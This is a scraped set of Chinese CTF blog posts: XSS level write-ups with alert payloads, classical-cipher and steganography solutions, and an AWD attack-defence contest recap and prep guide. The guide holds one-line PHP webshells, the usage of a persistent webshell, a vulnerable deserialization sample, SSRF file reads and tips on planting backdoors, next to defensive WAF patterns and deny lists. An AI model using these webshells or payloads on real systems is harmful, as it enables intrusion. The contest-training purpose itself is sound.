小白进阶ing。。。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.gitee.io/blog/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.gitee.io/blog/tags/CTF/"},{"name":"MISC","slug":"MISC","permalink":"https://qwzf.gitee.io/blog/tags/MISC/"},{"name":"安恒","slug":"安恒","permalink":"https://qwzf.gitee.io/blog/tags/安恒/"}],"author":"qwzf"},{"title":"XSS漏洞攻关(二)","slug":"XSS漏洞攻关(二)","date":"2019-07-14T11:01:42.540Z","updated":"2019-07-31T15:41:06.843Z","comments":true,"path":"2019/07/14/XSS漏洞攻关(二)/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/07/14/XSS漏洞攻关(二)/","excerpt":"","text":"前言之前已经总结过一部分xss的一些绕过方式，但由于其他原因没有总结完，现在有时间了，于是参考了大牛的博客，继续总结了一下。 正文XSS攻击常见利用方式(后续)7.HTTP头流量包注入这一部分需要抓包改包，还好之前学习了点HTTP协议基础。 就再次了解下BurpSuite怎么抓包改包就行了。 参考博客：Burpsuite拦截并修改request/response Level11 12 13 这三道题都是一样的利用方式，从Level10过来之后，会发现Level11的&lt;input&gt;标签里面t_ref默认值是该网页是从Level10页面链接过来的。 所以对其进行抓包，修改Referer参数。 因为Level11是referer，所以得用burpsuite来抓包改，直接用hackbar是改不了的。 参考payload: \" type=\"text\" onclick=\"alert() ” onmouseover='alert(1)' type=\"text\" 修改成payload之后，点击Forword转发报文(发包)即可 看到多出来一个框，因为我使用的是onclick事件，所以要鼠标点击一下才会触发。 Level12、Level13的payload是一样的，只是输入点不一样而已，Level12注入点是User-Agent，Level12注入点是cookie 8.其他后边的关卡好像比较难，就不分利用类型了。 Level 14 看了大牛的博客才知道这道题崩了。。。听说图片exif 藏有xss payload Level 15 看了大牛的博客，知道这一关考的是angular js的知识。好像不会。。。稍微百度一下相关知识 发现ng-include有包含文件的意思，也就相当于php里面的include。 发现可以包含第一关的页面， 参考payload: 'level1.php?name=&lt;img src=x onerror=alert(1)&gt;' 至于为什么这么构造payload。现在还不太懂。。。 Level 16 与Level 15相比，过滤了空格。可以选择用其他符号来绕过。如：%0a%0d 参考payload: &lt;img%0a%0dsrc=x%0a%0donerror=alert(1)&gt; Level 17 18 这两关的考点是一样的，同样的payload可以绕过。 参考payload: onmouseover=alert(1) 注意：onmouseover前面有一个空格 Level 19 20 都过滤了双引号，闭合不了。看大牛的博客，发现应该是考flash的。我不会，略过。。。去看一下21题，好像崩了。。。。就先这样吧。。。 感悟这次闯关，又学习到不少知识。尤其是学到了burpsuite的抓包改包相关的知识。 这次做题有点着急。由于不会，看了一些参考博客，这样不利于自己解题。希望自己再接再励。。 小白进阶ing","categories":[{"name":"Web","slug":"Web","permalink":"https://qwzf.gitee.io/blog/categories/Web/"}],"tags":[{"name":"BUG","slug":"BUG","permalink":"https://qwzf.gitee.io/blog/tags/BUG/"},{"name":"XSS","slug":"XSS","permalink":"https://qwzf.gitee.io/blog/tags/XSS/"}],"author":"qwzf"},{"title":"Crypto-位移编码","slug":"Crypto-位移编码","date":"2019-07-12T13:32:41.000Z","updated":"2019-07-31T15:46:31.161Z","comments":true,"path":"2019/07/12/Crypto-位移编码/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/07/12/Crypto-位移编码/","excerpt":"","text":"前言学习了解了一下简单的移位编码，于是做题总结了一下 Crypto1：困在栅栏里的凯撒 看到题目，应该和凯撒密码和栅栏密码有关。所以做题之前先了解一下栅栏密码和凯撒密码 栅栏密码栅栏密码是一种简单的移动字符位置的加密方法，规则简单，容易破解。栅栏密码的加密方式：把文本按照一定的字数分成多个组，取每组第一个字连起来得到密文1，再取每组第二个字连起来得到密文2……最后把密文1、密文2……连成整段密文。例如： 明文：栅栏密码加密规则示例每组字数：5 按照字数先把明文分成：栅栏密码加密规则示例 先取每组第一个字：栅密再取每组第二个字：栏规…… 最后得到“栅密栏规密则码示加例”。 解密则反推：密文被分成2个字一组：栅密栏规密则码示加例 先取每组第一个字：栅栏密码加再取每组第二个字：密规则示例 最后得到“栅栏密码加密规则示例”。 凯撒密码凯撒密码最早由古罗马军事统帅盖乌斯·尤利乌斯·凯撒在军队中用来传递加密信息，故称凯撒密码。这是一种位移加密方式，只对26个字母进行位移替换加密，规则简单，容易破解。下面是位移1次的对比： 明文字母表 Z A B C D E F G H I J K L M N O P Q R S T U V W X Y 密文字母表 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 将明文字母表向后移动1位，A变成了B，B变成了C……，Z变成了A。同理，若将明文字母表向后移动3位： 明文字母表 X Y Z A B C D E F G H I J K L M N O P Q R S T U V W 密文字母表 A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 则A变成了D，B变成了E……，Z变成了C。 字母表最多可以移动25位。凯撒密码的明文字母表向后或向前移动都是可以的，通常表述为向后移动，如果要向前移动1位，则等同于向后移动25位，位移选择为25即可。 下面开始做题 ”困在栅栏里的凯撒“，应该是先栅栏解密，再凯撒解密。因为直接先凯撒好像没有规律。 想到最后结果开头应该是CTF或flag。所以栅栏解密时，花括号前有三个或四个字母 然后再凯撒解密 得到flag了。。。。 Crypto2：变异凯撒 格式是flag{}，与密文的ASCII比较发现 一步一步比较： flag{Caesar_variation} 这样就得到flag了。。 Crypto3：密文 rot13 先了解一下 rot13的相关知识ROT5、ROT13、ROT18、ROT47 编码是一种简单的码元位置顺序替换暗码。此类编码具有可逆性，可以自我解密，主要用于应对快速浏览，或者是机器的读取，而不让其理解其意。 ROT5 是 rotate by 5 places 的简写，意思是旋转5个位置，其它皆同。下面分别说说它们的编码方式：ROT5：只对数字进行编码，用当前数字往前数的第5个数字替换当前数字，例如当前为0，编码后变成5，当前为1，编码后变成6，以此类推顺序循环。ROT13：只对字母进行编码，用当前字母往前数的第13个字母替换当前字母，例如当前为A，编码后变成N，当前为B，编码后变成O，以此类推顺序循环。ROT18：这是一个异类，本来没有，它是将ROT5和ROT13组合在一起，为了好称呼，将其命名为ROT18。ROT47：对数字、字母、常用符号进行编码，按照它们的ASCII值进行位置替换，用当前字符ASCII值往前数的第47位对应字符替换当前字符，例如当前为小写字母z，编码后变成大写字母K，当前为数字0，编码后变成符号_。用于ROT47编码的字符其ASCII值范围是33－126，具体可参考ASCII编码。 于是rot13解码，得到最终结果 感悟总结又使我收获好多，题比较基础，不过可以借此了解一下移位编码的基础知识。继续努力！！！ 小白进阶ing。。。。。。。。。。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.gitee.io/blog/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.gitee.io/blog/tags/CTF/"},{"name":"Crypto","slug":"Crypto","permalink":"https://qwzf.gitee.io/blog/tags/Crypto/"},{"name":"移位编码","slug":"移位编码","permalink":"https://qwzf.gitee.io/blog/tags/移位编码/"}],"author":"qwzf"},{"title":"MISC-图片隐写","slug":"MISC-图片隐写","date":"2019-07-10T13:05:43.000Z","updated":"2019-07-31T15:51:18.897Z","comments":true,"path":"2019/07/10/MISC-图片隐写/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/07/10/MISC-图片隐写/","excerpt":"","text":"MISC1：Paint&amp;Scan标题的意思是画图和扫描 题目提示也是。下载题目文件并解压，得到txt文件。打开 很明显就是画图了。用到画图工具gnuplot。所以先替换，将坐标转换成gnuplot能识别的格式 然后开始画图，画图命令plot &quot;Paint&amp;Scan.txt&quot; 画出了张二维码 二维码扫一下，得到flag MISC2：九连环 题目没有提示。打开链接保存jpg图片 binwalk分析一下 图片里隐藏了文件，foremost分离一下。为了方便，可以直接用winRAR打开jpg图片，并解压隐藏文件。 有一个加密了。先看是不是伪加密 是伪加密，把504B0102后第五、第六位0108改为0000，即可破解伪加密 解压 这应该是张jpg图片，用winHex查看果然是。加文件后缀.jpg，打开图片 没有有效信息，那看一下解压得到的qwe.zip压缩包，用winRAR打开 发现加密的flag.txt文件。用winHex打开qwe.zip，发现并不是伪加密。好像进行不下去了，于是参考了下大牛的博客。发现要用到一个工具steghide。 用法：steghide extract -sf picture.jpg 然后输入密码，没有密码则回车跳过 于是刚才那张图片就可以用到了 得到一个ko.txt文件。打开，发现flag.txt文件的密码了，输入密码，打开flag.txt。得到flag MISC3：欢迎来到地狱 下载题目文件并解压 打开地狱伊始.jpg 无法打开，用winHex查看一下文件格式，发现缺少文件头 jpg图片的文件头是FFD8FF，添加文件头 保存图片并打开 图片里有个百度云盘链接，输入浏览器打开 下载wav音频文件，播放，发现比较有规律。应该是音频隐写了。使用音频分析工具Audacity打开wav文件，然后 发现大致有三种波形。想到了摩斯电码，于是将不同波形转换成摩斯电码 摩斯电码解密得到 打开第二层地狱.docx，发现被加密了。上面应该就是密码了，有点坑的是密码小写，即letusgo 打开之后，选择显示隐藏文字 发现 image steganography(图片隐写术) 解密网站：https://www.atool.org/steganography.php 所以保存word文档里的图片，用上面网站解密 这应该就是快到终点了.zip的解压密码了 同理解压地狱大门.jpg 打开最后一层地狱.txt 8位二进制一组，二进制转ASCII码 发现解密结果是：弱口令 将地狱大门.jpg用winRAR打开，发现txt加密文件。并不是伪加密，应该就是上边提示的是弱口令。改地狱大门.jpg后缀为.zip，用Ziperello和弱口令字典破解得 输入密码解压txt文件，并打开 很明显Base64解码 继续转 发现Salted，应该就是所谓的“加盐”了 试了之后发现是加密算法是Rabbit 看到明文，结合txt文件里“凯撒家族”和“sixfour”，应该要凯撒解密,且偏移量可能是10或6或4。为了方便，我直接找到解密所有结果的 得到flag了。 做了三道题，总结完毕。小白进阶ing","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.gitee.io/blog/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.gitee.io/blog/tags/CTF/"},{"name":"MISC","slug":"MISC","permalink":"https://qwzf.gitee.io/blog/tags/MISC/"},{"name":"隐写","slug":"隐写","permalink":"https://qwzf.gitee.io/blog/tags/隐写/"}],"author":"qwzf"},{"title":"ISCC2019线下赛总结","slug":"ISCC2019线下赛总结","date":"2019-06-23T16:07:01.996Z","updated":"2020-01-11T16:35:37.679Z","comments":true,"path":"2019/06/24/ISCC2019线下赛总结/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/06/24/ISCC2019线下赛总结/","excerpt":"","text":"前言今年的ISCC线下赛，完美结束了。这是我第一次参加ctf线下赛，同时非常有幸能够参加这次竞赛。在比赛中又学到了好多知识。于是现在按照惯例，当然是总结一下了。。。。。。 简介整个赛程分为：上午的选择题、ctf题和下午的攻防赛。 上午的选择题，大部分是去年的原题。ctf题感觉有点难度，不过前两道，也是原题。 在下午赛程中几乎被大佬们吊打。在大佬打我们的私地1的时候，我们还没做出自己私地1的题，也意味着我们还没拿到自己的第一个靶机。。。再次显示出我很菜很菜。 正文看着分不断往下掉。心理非常慌，不断查百度、google，找到了非常类似的题，队友复现一波，我们终于有机会拿到自己队的第一个靶机。 1、获得ssh私地1：私地1解题详情。 私地2：私机二是高端口，可以扫出来是12580。然而，第二个靶机我们并没拿到，后期被打的很惨。。。。 2、登录连接ssh意想不到的是，拿到ssh账号和密码后，竟没有第一时间登陆上，而又刚好开始了新的一轮，以至于我们再次掉分。 主要是上面这个，当我意外的把“密码”改成“Keybord Interactive”的时候，登上了，但是当时不知道为什么，毕竟第一次参加线下赛。于是我现在查了一下原因，发现： 基于口令的验证方式（password authentication method），通过输入用户名和密码的方式进行远程机器的登录验证。基于公共密钥的安全验证方式（public key authentication method），通过生成一组密钥（public key/private key）来实现用户的登录验证。基于键盘交互的验证方式（keyboard interactive authentication method），通过服务器向客户端发送提示信息，然后由客户端根据相应的信息通过手工输入的方式发还给服务器端。 3、修补防御在登陆上ssh账号和密码后。我们做的第一件事情就是备份！备份！备份！ 然后如果某次遇到弱口令，一定要改ssh密码，我还不会改。。。。 接下来，开启修补漏洞、删后门的工作l。 1.WAF我先上waf 用法： 将waf.php传到要包含的文件的目录 在所需要防护的页面加入代码require_once(&#39;waf.php&#39;);就可以做到页面防注入、跨站。 如果想整站防注，就在网站的一个公用文件中，如数据库链接文件config.inc.php中！添加require_once(&#39;waf.php&#39;);来调用本代码 2.文件监控学长赛前给了个脚本，但是作为十成十的小白，当时没有用，也不太会用。 用法： jiankong.py /var/www/html 网上也有很多文件监控脚本，也可以自己搜下。 3.删后门先用D盾扫了下，没发现后门。。。那手工检查下吧，emmmm。。。发现了好多后门，有点尴尬！然后我开始了删除大佬后门的操作，本来感觉一切都很顺利。然而，当队友看我删完后，他刷新一下，发现有两个删过的后门又出现了。。。试了几次依旧删不掉。猜想这俩应该就是不死马了。 不死马的使用： URL+.index.php POST pass=Sn3rtf4ck9&amp;a=system('ipconfig'); 例如： http://127.0.0.1/.index.phppost：pass=Sn3rtf4ck9&amp;a=system('ipconfig'); 我们被按的两个不死马如下： 然而，我并没有删过不死马。于是看了赛前学长给我们的工具包，发现解除不死马的文件了。 emmmmm。。。。发现并不会用。作为小白的我，有点蓝瘦。亡羊补牢一下吧，现在开始学习了解一下： 解除不死马： 方法一：找工作人员重置私地虚拟机（听说有三次机会） 方法二：写个脚本不断查杀 方法三：找到木马名字。找到创建，木马对应的进程。修改解除不死马.php 4、日志分析我忘了放上去了。。。。。。但这也是很重要的 1.感知可能正在发生的攻击，从而规避存在的安全风险 2.应急响应，还原攻击者的攻击路径，从而挽回已经造成的损失 记录log脚本 这种脚本网上有很多。 脚本 &lt;?phpdate_default_timezone_set('Asia/Shanghai');$ip = $_SERVER[\"REMOTE_ADDR\"]; //记录访问者的ip$filename = $_SERVER['PHP_SELF'];//访问者要访问的文件名$parameter = $_SERVER[\"QUERY_STRING\"]; //访问者要请求的参数$time = date('Y-m-d H:i:s',time()); //访问时间$logadd = '来访时间：'.$time.'--&gt;'.'访问链接：'.'http://'.$ip.$filename.'?'.$parameter.\"rn\";// log记录$fh = fopen(\"log.txt\", \"a\");fwrite($fh, $logadd);fclose($fh);?&gt; 日志分析工具 1.LogForensics 腾讯实验室 https://security.tencent.com/index.php/opensource/detail/15 2.北风飘然@金乌网络安全实验室 https://www.freebuf.com/sectool/126698.html 3.网络ID为piaox的安全从业人员： https://www.freebuf.com/sectool/110644.html 4.网络ID：SecSky https://www.freebuf.com/sectool/8982.html 5.网络ID：鬼魅羊羔 http://www.freebuf.com/articles/web/96675.html 5、后门利用我们猜想其他很多人也应该有这个被按的不死马漏洞，那就利用一下吧。菜刀连一下，然而试了好多都没有连上。。。不知什么原因。也许是因为本小白太菜了。。。 6、攻击本小白太垃圾了，还没学会。会个SQL注入，结果好像也没用到。还有个一句话木马。 并且，连怎么攻击都不知道。。。。。。我果然够菜！ 漏洞类型：sqli居多、文件包含、各种rce、文件上传 感悟这次参加线下赛收获了好多关于线下赛的知识，体验了一次线下赛的感觉。游戏体验还行，两个私地，基本上防住了一个。遗憾的是，没有借此机会，认识一些大佬。。希望自己再接再励。。 小白进阶ing。。。。","categories":[{"name":"AWD","slug":"AWD","permalink":"https://qwzf.gitee.io/blog/categories/AWD/"}],"tags":[{"name":"线下","slug":"线下","permalink":"https://qwzf.gitee.io/blog/tags/线下/"},{"name":"ISCC","slug":"ISCC","permalink":"https://qwzf.gitee.io/blog/tags/ISCC/"}],"author":"qwzf"},{"title":"CTF线下赛AWD攻防准备","slug":"CTF线下赛AWD攻防准备","date":"2019-06-19T11:45:58.200Z","updated":"2019-08-08T15:43:47.806Z","comments":true,"path":"2019/06/19/CTF线下赛AWD攻防准备/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/06/19/CTF线下赛AWD攻防准备/","excerpt":"","text":"最近发现一篇博客。感觉对CTF线下赛-AWD模式，总结比较好。于是学习了解了一下，为了方便寻找，把这篇博客复制了过来，并补充了点。。。 1、赛制流程：攻防模式（AWD）常见于线下攻防一般比赛的具体环境会在开赛前半个小时由比赛主办方给出，前半个小时应熟悉配置环境。准备网线、网线转接口。 最好的防御就是攻击，不做好安全加固就会被吊打。 2、 赛前准备：常用工具：(整理适合自己的) Burpsuite sqlmap nmap、masscan nc D盾 Xshell、Xftp 菜刀或蚁剑 Chrome、Firefox各类插件 一句话木马： php asp aspx jsp 内存马 py库、脚本： pwntools requests 软waf 日志分析 Exp SSH客户端： PuTTY XShell 编辑器： Sublime VS Code Notepad++ Vim 个人知识库 常见应用源码库 Writeup集合 基础知识： 语言运用：编写自动化脚本等…… WEB安全：熟悉常见漏洞类型、常见框架…… pwn型：需要较好的底层基础、懂汇编等，需要理解各种堆栈溢出的原理、基础密码学…… 中间件：apache、nginx、tomcat、jboss、weblogic 语言基础：php、java、python 常见web应用：phpmyadmin、dedecms、phpcms、帝国cms、Discuz linux命令：netstat -tulpn 、ps -ef Gamebox: 系统：ubuntu、centos 中间件、版本： apache \\ nginx php \\ php-fpm tomcat \\ jboss \\ weblogic web程序 数据库： MySQL \\ MariaDB \\ Oracle Redis \\ MongoDB 3、常见加固方式：加固流程： 修改网站管理员密码 备份网站源码 tar -zcf /tmp/name.tar.gz /path/web tar -zcf /tmp/name.tar.gz /var/www/html 备份数据库 mysqldump -u 用户名 -p 数据库名 &amp;gt; 导出的文件名 mysqldump -u user -p database &amp;gt; /tmp/database.sql 修改ssh密码（即修改当前用户密码） 修改MySQL密码 set password for 用户名@localhost = password(&#39;新密码&#39;); set password for user@localhost = password(&#39;123&#39;); 修改MongoDB密码（27017端口） 修改Redis密码（6379端口） 修改网站源码中的数据库连接配置 部署waf（视情况而定） 准备一个软waf 如何使用phpwaf.php 找到CMS/框架通用配置文件进行包含： PHPCMS V9：\\phpcms\\base.php PHPWIND8.7：\\data\\sql_config.php DEDECMS5.7：\\data\\common.inc.php DiscuzX2：\\config\\config_global.php WordPress：\\wp-config.php Metinfo：\\include\\head.php 修改php.ini文件后重启（高权限）: 禁用敏感函数： disable_functions = system,exec,shell_exec,passthru,proc_open,proc_close,proc_get_status,checkdnsrr,getmxrr,getservbyname,getservbyport, syslog,popen,show_source,highlight_file,dl,socket_listen,socket_create,socket_bind,socket_accept, socket_connect, stream_socket_server, stream_socket_accept,stream_socket_client,ftp_connect, ftp_login,ftp_pasv,ftp_get,sys_getloadavg,disk_total_space, disk_free_space,posix_ctermid,posix_get_last_error,posix_getcwd, posix_getegid,posix_geteuid,posix_getgid, posix_getgrgid,posix_getgrnam,posix_getgroups,posix_getlogin,posix_getpgid,posix_getpgrp,posix_getpid,posix_getppid,posix_Tupungato,posix_getpwuid, posix_getrlimit, posix_getsid,posix_getuid,posix_isatty, posix_kill,posix_mkfifo,posix_setegid,posix_seteuid,posix_setgid, posix_setpgid,posix_setsid,posix_setuid,posix_strerror,posix_times,posix_ttyname,posix_uname 自动包含waf：auto_prepend_file = safe.php路径; 分析日志文件 文件监控 准备一个脚本，监控并删除所有新增文件。 发现内存马，直接重启php。 若监控脚本无法使用，使用命令定期查看新增与修改文件。 find web路径 -ctime -1 （查看最近一日新增的文件，是否可疑） 修改目录权限：(可能会违规) chmod -R 644 www waf脚本 &lt;?php //部署waf可能会导致服务不可用，需要谨慎部署。 error_reporting(0); define('LOG_FILENAME','log.txt'); function waf() &#123; if (!function_exists('getallheaders')) &#123; function getallheaders() &#123; foreach ($_SERVER as $name =&gt; $value) &#123; if (substr($name, 0, 5) == 'HTTP_') $headers[str_replace(' ', '-', ucwords(strtolower(str_replace('_', ' ', substr($name, 5)))))] = $value; &#125; return $headers; &#125; &#125; $get = $_GET; $post = $_POST; $cookie = $_COOKIE; $header = getallheaders(); $files = $_FILES; $ip = $_SERVER[\"REMOTE_ADDR\"]; $method = $_SERVER['REQUEST_METHOD']; $filepath = $_SERVER[\"SCRIPT_NAME\"]; //rewirte shell which uploaded by others, you can do more foreach ($_FILES as $key =&gt; $value) &#123; $files[$key]['content'] = file_get_contents($_FILES[$key]['tmp_name']); file_put_contents($_FILES[$key]['tmp_name'], \"virink\"); &#125; unset($header['Accept']);//fix a bug $input = array(\"Get\"=&gt;$get, \"Post\"=&gt;$post, \"Cookie\"=&gt;$cookie, \"File\"=&gt;$files, \"Header\"=&gt;$header); //deal with $pattern = \"select|insert|update|delete|and|or|\\'|\\/\\*|\\*|\\.\\.\\/|\\.\\/|union|into|load_file|outfile|dumpfile|sub|hex\"; $pattern .= \"|file_put_contents|fwrite|curl|system|eval|assert\"; $pattern .=\"|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore\"; $pattern .=\"|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec\"; $vpattern = explode(\"|\",$pattern); $bool = false; foreach ($input as $k =&gt; $v) &#123; foreach($vpattern as $value)&#123; foreach ($v as $kk =&gt; $vv) &#123; if (preg_match( \"/$value/i\", $vv ))&#123; $bool = true; logging($input); break; &#125; &#125; if($bool) break; &#125; if($bool) break; &#125; &#125; function logging($var)&#123; file_put_contents(LOG_FILENAME, \"\\r\\n\".time().\"\\r\\n\".print_r($var, true), FILE_APPEND); // die() or unset($_GET) or unset($_POST) or unset($_COOKIE); &#125; waf();?&gt; 文件监控脚本 # -*- coding: utf-8 -*-#use: python file_check.py ./import osimport hashlibimport shutilimport ntpathimport timeCWD = os.getcwd()FILE_MD5_DICT = &#123;&#125; # 文件MD5字典ORIGIN_FILE_LIST = []# 特殊文件路径字符串Special_path_str = 'drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82'bakstring = 'bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS'logstring = 'log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'webshellstring = 'webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD'difffile = 'diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN'Special_string = 'drops_log' # 免死金牌UNICODE_ENCODING = \"utf-8\"INVALID_UNICODE_CHAR_FORMAT = r\"\\?%02x\"# 文件路径字典spec_base_path = os.path.realpath(os.path.join(CWD, Special_path_str))Special_path = &#123; 'bak' : os.path.realpath(os.path.join(spec_base_path, bakstring)), 'log' : os.path.realpath(os.path.join(spec_base_path, logstring)), 'webshell' : os.path.realpath(os.path.join(spec_base_path, webshellstring)), 'difffile' : os.path.realpath(os.path.join(spec_base_path, difffile)),&#125;def isListLike(value): return isinstance(value, (list, tuple, set))# 获取Unicode编码def getUnicode(value, encoding=None, noneToNull=False): if noneToNull and value is None: return NULL if isListLike(value): value = list(getUnicode(_, encoding, noneToNull) for _ in value) return value if isinstance(value, unicode): return value elif isinstance(value, basestring): while True: try: return unicode(value, encoding or UNICODE_ENCODING) except UnicodeDecodeError, ex: try: return unicode(value, UNICODE_ENCODING) except: value = value[:ex.start] + \"\".join(INVALID_UNICODE_CHAR_FORMAT % ord(_) for _ in value[ex.start:ex.end]) + value[ex.end:] else: try: return unicode(value) except UnicodeDecodeError: return unicode(str(value), errors=\"ignore\")# 目录创建def mkdir_p(path): import errno try: os.makedirs(path) except OSError as exc: if exc.errno == errno.EEXIST and os.path.isdir(path): pass else: raise# 获取当前所有文件路径def getfilelist(cwd): filelist = [] for root,subdirs, files in os.walk(cwd): for filepath in files: originalfile = os.path.join(root, filepath) if Special_path_str not in originalfile: filelist.append(originalfile) return filelist# 计算机文件MD5值def calcMD5(filepath): try: with open(filepath,'rb') as f: md5obj = hashlib.md5() md5obj.update(f.read()) hash = md5obj.hexdigest() return hash except Exception, e: print u'[!] getmd5_error : ' + getUnicode(filepath) print getUnicode(e) try: ORIGIN_FILE_LIST.remove(filepath) FILE_MD5_DICT.pop(filepath, None) except KeyError, e: pass# 获取所有文件MD5def getfilemd5dict(filelist = []): filemd5dict = &#123;&#125; for ori_file in filelist: if Special_path_str not in ori_file: md5 = calcMD5(os.path.realpath(ori_file)) if md5: filemd5dict[ori_file] = md5 return filemd5dict# 备份所有文件def backup_file(filelist=[]): # if len(os.listdir(Special_path['bak'])) == 0: for filepath in filelist: if Special_path_str not in filepath: shutil.copy2(filepath, Special_path['bak'])if __name__ == '__main__': print u'---------start------------' for value in Special_path: mkdir_p(Special_path[value]) # 获取所有文件路径，并获取所有文件的MD5，同时备份所有文件 ORIGIN_FILE_LIST = getfilelist(CWD) FILE_MD5_DICT = getfilemd5dict(ORIGIN_FILE_LIST) backup_file(ORIGIN_FILE_LIST) # TODO 备份文件可能会产生重名BUG print u'[*] pre work end!' while True: file_list = getfilelist(CWD) # 移除新上传文件 diff_file_list = list(set(file_list) ^ set(ORIGIN_FILE_LIST)) if len(diff_file_list) != 0: # import pdb;pdb.set_trace() for filepath in diff_file_list: try: f = open(filepath, 'r').read() except Exception, e: break if Special_string not in f: try: print u'[*] webshell find : ' + getUnicode(filepath) shutil.move(filepath, os.path.join(Special_path['webshell'], ntpath.basename(filepath) + '.txt')) except Exception as e: print u'[!] move webshell error, \"%s\" maybe is webshell.'%getUnicode(filepath) try: f = open(os.path.join(Special_path['log'], 'log.txt'), 'a') f.write('newfile: ' + getUnicode(filepath) + ' : ' + str(time.ctime()) + '\\n') f.close() except Exception as e: print u'[-] log error : file move error: ' + getUnicode(e) # 防止任意文件被修改,还原被修改文件 md5_dict = getfilemd5dict(ORIGIN_FILE_LIST) for filekey in md5_dict: if md5_dict[filekey] != FILE_MD5_DICT[filekey]: try: f = open(filekey, 'r').read() except Exception, e: break if Special_string not in f: try: print u'[*] file had be change : ' + getUnicode(filekey) shutil.move(filekey, os.path.join(Special_path['difffile'], ntpath.basename(filekey) + '.txt')) shutil.move(os.path.join(Special_path['bak'], ntpath.basename(filekey)), filekey) except Exception as e: print u'[!] move webshell error, \"%s\" maybe is webshell.'%getUnicode(filekey) try: f = open(os.path.join(Special_path['log'], 'log.txt'), 'a') f.write('diff_file: ' + getUnicode(filekey) + ' : ' + getUnicode(time.ctime()) + '\\n') f.close() except Exception as e: print u'[-] log error : done_diff: ' + getUnicode(filekey) pass time.sleep(2) # print '[*] ' + getUnicode(time.ctime()) 4、攻防演练：如何获得flag？在实际比赛中，一般有两种方式获取flag，一种是先获取webshell权限，然后去读flag文件，另一种则是直接通过漏洞读取flag文件。 Getshell： 官方后门、文件上传 文件写入、文件包含 命令注入、反序列化 Redis写shell Mysql写shell 直接读文件： SSRF 任意文件读取 XXE 文件包含 Sqli 1. web后门：在任意APP的某个文件的源码中加上一句话后门。 @eval($_POST[‘XXX’]); @assert($_POST[‘XXX’]); system($_REQUEST[‘CMD’]); 对于这种类型的漏洞，只要用正则遍历匹配就能找到grep -r &quot;eval\\(\\$_&quot;或者还有一些复杂变异的后门，这种情况就可以选择使用D盾Webshell查杀或者SafeDog之类的工具对源码进行扫描。只要删掉就可以解决。 2. 系统后门 NC后门 SSH后门 suid后门 3. webshell： 内存马：不断生成shell文件 Webshell密码：给Webshell增加密码，增加一个password参数MD5 4. 文件上传： put方法： Tomcat远程代码执行漏洞分析(CVE-2017-12615) 一般上传： 各种绕过方式一定要熟悉 常见改包、解析漏洞、图片渲染、逻辑文件（双文件上传）、条件竞争 防护方式——白名单、禁止上传目录执行权限、上传于Web目录外 5. 文件写入： 缓存： 存在缓存机制，后缀名为php，直接代码执行。 -配置文件： 单引号内：输入单引号，尝试逃逸。如&#39;+@phpinfo()+&#39; 双引号内：输入会被解析的符号。如${@phpinfo()} 模板文件： 模板被包含，getshell。 创建新文件时无校验后缀名。 日志： 日志以php后缀保存，X-Forwarded-For来伪造ip植入木马。 6. 命令注入/反序列化：PHP中使用unserialize函数对数据进行反序列化，反序列化过程类的wakeup方法与destruct方法会被调用。 &lt;?phpclass TestClass&#123; public $variable; public function __destruct() &#123; print_r(shell_exec(\"ping \".$this-&gt;variable)); &#125;&#125;unserialize($_GET['data']);?&gt; 7. 文件读取： SSRF：存在服务器请求伪造漏洞时，可使用file协议读取本地文件。 http://127.0.0.1/read.php?url=file:///flag SQL注入：目标存在SQL注入时，可尝试直接读取flag。 常规注入、盲注、二次注入、insert注入、http头注入 读取select load_file() 写入select outfile()select dumpfile() 8. 困难漏洞：有时候出题者会直接丢一个0day，现场审计。找不到漏洞没关系，上Waf保平安，时刻关注你的日志记录，NPC也会打出攻击流量。 找到别人写在自己服务器上的shell，一般其他服务器也会有，可以去留后门。 Collected by 此名如此彪悍 如有侵权，请敬请告知！！联系方式qq：1739381035","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.gitee.io/blog/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.gitee.io/blog/tags/CTF/"},{"name":"AWD","slug":"AWD","permalink":"https://qwzf.gitee.io/blog/tags/AWD/"}],"author":"qwzf"},{"title":"BUGKU做题总结(一)","slug":"BUGKU做题总结(一)","date":"2019-06-18T13:11:11.134Z","updated":"2019-07-31T16:16:47.809Z","comments":true,"path":"2019/06/18/BUGKU做题总结(一)/","link":"","permalink":"https://qwzf.gitee.io/blog/2019/06/18/BUGKU做题总结(一)/","excerpt":"","text":"最近抽出一点时间练了一些BUGKU练习平台的MISC题，又学到了一些知识，感觉很好。现在总结一下当时没有立刻做出的、并有的借鉴大佬的题，加深加深自己的做题印象。 MISC1(啊哒)本题主要是数据隐藏 先看题目 额，没什么有用信息。那下载题目文件，发现是压缩包。用winrar打开，发现了一张jpg图片。 图片。。。一般遇到图片，先查看属性看是否有隐藏信息。然后用winhex打开，我发现这个地方竟如此可疑。 当然，用记事本打开会更加明显，亲测。。。很明显这是十六进制，十六进制转字符串一波走起。。 提交然而并不对。于是思考尝试后发现ada.jpg用winrar打开 很明显，刚才得到的字符串应该就是这个加密文件的密码了。果然如此，输入密码解压文件得到 MISC2(宽带信息泄露)本题主要是查看路由器备份的配置文件 